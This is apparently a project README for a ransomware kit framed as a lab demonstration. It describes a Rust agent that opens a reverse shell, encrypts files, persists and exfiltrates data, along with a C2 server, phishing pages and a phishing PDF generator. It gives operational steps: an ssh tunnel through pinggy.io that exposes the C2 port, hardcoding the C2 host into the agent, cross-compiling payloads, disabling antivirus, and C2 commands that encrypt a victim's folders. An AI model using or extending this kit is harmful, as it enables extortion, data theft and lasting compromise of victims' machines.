## About the Project

This project demonstrates the mechanics of a modern ransomware attack under laboratory conditions. It consists of the following main components:

1. Malware Agent (Rust): An agent written in Rust that runs on the target system. It establishes a reverse shell, encrypts files atomically (AES-256-CTR), and establishes persistence.
2. C2 Server (Python): A Command-and-Control server that manages multiple bots, sends commands, and controls decryption.
3. Delivery Server (DbD-Site): A web server simulating Drive-by-Download attacks and delivering OS-specific payloads.
4. PDF Phishing: A generator for phishing PDFs designed to trick the victim into downloading the malware.

The goal is to explain and demonstrate how ransomware functions.

## Features

### 1. Attack Chain

```mermaid

    subgraph Delivery [1. Delivery Phase]
        PDF[Phishing PDF]
        DbD[Drive-by-Download Site]
    end

    subgraph Infection [2. Infection]
        Payload[Rust Payload]
    end

    subgraph C2 [3. Command & Control]
        Server[C2 Server]
        Tunnel[Pinggy Tunnel]
    end

    PDF --> |"Click on Link"| DbD
    DbD --> |"OS-Detection"| Payload
    Payload --> |"Reverse Shell"| Tunnel
    Tunnel --> Server
```

### Network Communication (Reverse Shell)

The client actively connects outward to the server, bypassing typical firewall rules that block incoming traffic.

```mermaid
graph LR
    subgraph Victim_Network [Victim Network]
        Client[Rust Agent]
        Firewall[Firewall / NAT]
    end

    subgraph Internet
        Tunnel[Pinggy.io / Ngrok Tunnel]
    end

    subgraph Attacker_Network [Attacker Network]
        Server[Python C2 Server]
    end

    Client -- "1. TCP Connect (Outbound)" --> Firewall
    Firewall -- "2. Forward" --> Tunnel
    Tunnel -- "3. Tunneling" --> Server
    Server -. "4. Commands (encrypt/decrypt)" .-> Client
```

---

### 3. Encryption Process (Atomic Encryption)

To prevent data loss during crashes, the agent uses an atomic procedure.

```mermaid
sequenceDiagram
    participant FS as Filesystem
    participant Agent as Rust Agent

    Agent->>FS: 1. Open original file (e.g., doc.txt)
    Agent->>FS: 2. Create temp file (doc.enc_temp)
    loop Stream Processing
        Agent->>FS: Read chunk (4KB)
        Agent->>Agent: AES-256-CTR Encryption
        Agent->>FS: Write chunk to temp file
    end
    Agent->>FS: 3. Atomic rename (doc.enc_temp -> doc.locked)
    Agent->>FS: 4. Delete original file (doc.txt)
```

---

## Quick Start (Automated Scripts)

The project contains shell scripts for a simplified workflow:

```bash
# Terminal 1: Start Pinggy Tunnel (note the Host & Port!)
./run_pinggy.sh

# Terminal 2: Start C2 Server
./run_c2.sh

# Terminal 3: Compile Payloads (after configuring Pinggy!)
./build_payloads.sh

# Terminal 4: Start Delivery Server (optional)
./run_delivery.sh
```

### Workflow Order

1. **`./run_pinggy.sh`** - Starts TCP tunnel, outputs Host & Port.
2. Configure `malware_agent/src/main.rs` with Pinggy details.
3. **`./build_payloads.sh`** - Compile for Linux/Windows/Mac.
4. **`./run_c2.sh`** - Starts the Command-and-Control (C&C) Server.
5. **`./run_delivery.sh`** - Starts the Drive-by-Download Server.

---

## Manual Installation & Start

### C2 Server (Attacker)

1. **Start Server Locally**

```bash
cd c2_server
python3 server.py
```

The server listens on port **4444** by default.

2. **Make Server Publicly Available (Pinggy.io)**

To allow the client to connect from another network (or VM), a public tunnel is used.

```bash
# Starts a TCP tunnel to your local port 4444
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -p 443 -R0:localhost:4444 tcp@a.pinggy.io
```

**Note the output!** It will look something like this:

```
tcp://ylruu-90-186-43-205.a.free.pinggy.link:39005
Host: ylruu-90-186-43-205.a.free.pinggy.link
Port: 39005
```

> Note: Keep this terminal open, otherwise the connection will break.

---

### Delivery Server (Drive-by-Download)

The Delivery Server simulates phishing websites and delivers OS-specific payloads.

1. **Start Server**

```bash
cd delivery/DbD-Site
python3 server.py
```

The server runs on port 3000 and offers the following endpoints:

- `/game` - Fake Gaming Page
- `/security` - Fake Security Alert
- `/prize` - Fake Lottery/Prize Page
- `/get_document` - Smart Download (automatically detects OS)

2. **Phishing PDF generieren**

```bash
cd delivery/pdf_phishing
pip install -r requirements.txt
python3 generate_phishing_pdf.py
```

The PDF contains a blurred "invoice background" with a link leading the victim to the Delivery Server.

---

## Malware Agent Kompilierung (Opfer)

Edit `malware_agent/src/main.rs` with your tunnel details:

### 1. Adjust Configuration

Open the file `malware_agent/src/main.rs` and enter the data from the Pinggy tunnel:

```Rust
// src/main.rs

// Enter the Pinggy URL here (WITHOUT tcp://)
const C2_IP: &str = "ylruu-90-186-43-205.a.free.pinggy.link";

// Enter the Pinggy Port here
const C2_PORT: u16 = 39005;
```

### 2. Compile (Build)

**Option A: Automatic (Recommended)**

```bash
./build_payloads.sh
```

This script compiles for Linux, Windows, and Mac and automatically copies the payloads to the Delivery folder.

**Option B: Manual**

```bash
cd malware_agent
cargo build --release
```

### 3. Locate the Executable

After compiling, you will find the executable file here:

- Linux/Mac: `./target/release/rust_mw`
- Windows: `.\target\release\rust_mw.exe`

> **Warning:** Warning: Windows Defender or antivirus programs will likely delete this file immediately. Add the folder to exceptions or disable real-time protection for the demo.

### 4. Cross-Compilation

```bash
# Compile for Windows from Linux
cd malware_agent
RUSTFLAGS="-C link-args=-static" cargo build --release --target x86_64-pc-windows-gnu
```

---

## Operating the C2 Server

As soon as the victim executes the payload, the following appears in the server terminal:

`[+] Neue Verbindung: ID 1 from ...`

The server has an interactive shell. Here are the most important commands:

| Befehl                | Beschreibung                                             |
| --------------------- | -------------------------------------------------------- |
| `sessions`            | Lists all currently connected victims (bots)             |
| `interact <ID>`       | Switches to mode to control a specific bot               |
| `encrypt <ID> <PFAD>` | Encrypts a folder on the victim's PC                     |
| `decrypt <ID> [PFAD]` | Decrypts files. Without path, the root directory is used |
| `broadcast <CMD>`     | Sends a command to all connected bots simultaneously     |
| `help`                | Shows the help menu                                      |
| `exit`                | Exits the server                                         |

### Example Workflow

```bash
# Check connections
C2> sessions

# Interact with Victim 1
C2> interact 1

# Start encryption (on the Desktop)
ID 1> encrypt /home/user/Desktop

# (The client generates keys, encrypts files, and shows the ransom note)

# Start decryption (after "payment")
ID 1> decrypt

# Return to main menu
ID 1> background
```

---

## Process Management

To terminate the malware process on the victim system:

```bash
# Find process
pgrep -a rust

# Terminate process
pkill -f rust
```

---

## Technical Features

### Malware Agent

- **Stealth Mode:** On Windows, the console window is hidden (windows_subsystem). On Linux, the process runs as a daemon in the background.
- **Persistenz:**
  - Windows: Registry Key (`HKCU\...\Run`)
  - Linux: Systemd Service (`~/.config/systemd/user/`)
- **Crypto:** AES-256-CTR via RustCrypto Crate. The key is stored locally in `rescue.key`.
- **Data Exfiltration:** Stolen files are Base64 encoded and transferred to the C2 Server.
- **Wallpaper Change:** After encryption, the desktop background is replaced by a ransomware image:
  - The image (`ransom_wallpaper.jpg`) is embedded in the binary (`include_bytes!`)
  - Extracted automatically to `base_path` and set as wallpaper
  - Uses the `wallpaper` crate for cross-platform support
- **Ransom Note:** HTML file (`README_DECRYPT.html`) is created and automatically opened in the browser.

### Delivery Server

- **OS-Detection:** Automatically detects Windows/Linux/Mac based on the User-Agent.
- **Phishing-Seiten:** Pre-built Social Engineering templates (Game, Security, Prize).
- **Smart Download:** Endpoint `/get_document` delivers the matching payload based on OS.

### PDF Phishing

- **Blurred Invoice:** Generates a blurred invoice image as a lure.
- **Embedded Link:** Links to the Delivery Server to download the payload.
